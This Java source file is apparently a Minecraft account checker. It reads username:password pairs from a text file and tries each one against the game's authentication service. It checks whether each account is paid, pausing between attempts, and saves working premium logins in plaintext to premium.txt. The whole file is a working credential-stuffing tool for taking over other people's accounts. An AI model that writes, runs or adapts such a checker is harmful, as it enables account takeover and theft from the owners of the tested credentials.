package com.github.calenria;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.InputStreamReader;
import java.io.LineNumberReader;
import java.net.URL;
import java.util.UUID;

public class TestAccount {

    public static Boolean isPremium(String userName) {
        try {
            Boolean isPremium;
            URL url = new URL("https://www.minecraft.net/haspaid.jsp?user=" + userName);
            String pr = new BufferedReader(new InputStreamReader(url.openStream())).readLine().toUpperCase();

            if (pr.trim().equals("<HTML>")) {
                System.out.println("Premium Check Down!");
            }

            isPremium = Boolean.valueOf(pr);
            return isPremium;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }

    public static void checkAccount(String accountName, String accountPassword) {
        String uuid = UUID.randomUUID().toString();
        AuthManager am = new AuthManager();
        SessionResponse response = am.authenticate(accountName, accountPassword, uuid);
        System.out.print("Checking Account: " + accountName + " ...");
        if (response.getErrorMessage().length() == 0) {
            System.out.println("Valid Account!");
            for (Profile profile : response.getAvailableProfiles()) {
                String playerName = profile.getName();
                if (isPremium(playerName)) {
                    System.out.println("Checking Player: " + playerName + " is Premium!");
                    writePremiumList(accountName, accountPassword);
                }
            }
        } else {
            System.out.println(response.getErrorMessage());
        }
    }

    private static void writePremiumList(String accountName, String accountPassword) {
        // TODO Auto-generated method stub
        File premiumFile = new File("./premium.txt");

        try {
            if (!premiumFile.exists()) {
                premiumFile.createNewFile();
            }

            BufferedWriter bw = new BufferedWriter(new FileWriter(premiumFile, true));
            bw.write(accountName + " : " + accountPassword);
            bw.newLine();
            bw.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    public static void main(String[] args) {

        File testAccounts = new File("./test.txt");
        
        try {
            BufferedReader accounts = new BufferedReader(new FileReader(testAccounts));
            String line = "";
            
            LineNumberReader lineNumberReader = new LineNumberReader(new FileReader(testAccounts));
            lineNumberReader.skip(Long.MAX_VALUE);
            int lines = lineNumberReader.getLineNumber() + 1;
            int cnt = 0;
            while ((line = accounts.readLine()) != null) {
                String[] credencials = line.split(":");
                
                if(credencials.length >= 2) {
                    System.out.println("================ Testing " + ++cnt + "/" + lines + " ================");
                    checkAccount(credencials[0].trim(), credencials[1].trim());
                    System.out.println("================ ============= ================");
                    System.out.println();
                } else {
                    System.out.println("================ Error on Line " + ++cnt + "/" + lines + " ================");
                    System.out.println("Invalid Line: " + line);
                    System.out.println("================ ================ ================");
                }
                
                
                Thread.sleep(2000);
            }

            accounts.close();
            lineNumberReader.close();
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}
